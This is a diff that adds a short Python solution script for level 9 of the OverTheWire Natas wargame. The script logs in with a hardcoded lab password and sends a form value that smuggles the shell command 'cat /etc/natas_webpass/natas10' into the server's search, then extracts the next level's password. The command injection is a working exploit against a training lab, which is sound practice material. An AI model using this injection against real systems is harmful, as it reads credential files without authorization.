@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+
+import re
+import requests
+
+level = str(9)
+usr = f"natas{level}"
+passwd = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
+url = f"http://natas{level}.natas.labs.overthewire.org/"
+
+#response = requests.get(url, auth=(usr,passwd))
+response = requests.post(url, auth=(usr,passwd), data={"needle":".; cat /etc/natas_webpass/natas10 # ","submit":"submit"})
+
+content = response.text
+print(content)
+
+next_pass = re.findall("<pre>\n(.*)\n</pre>", content)[0]
+print(next_pass)
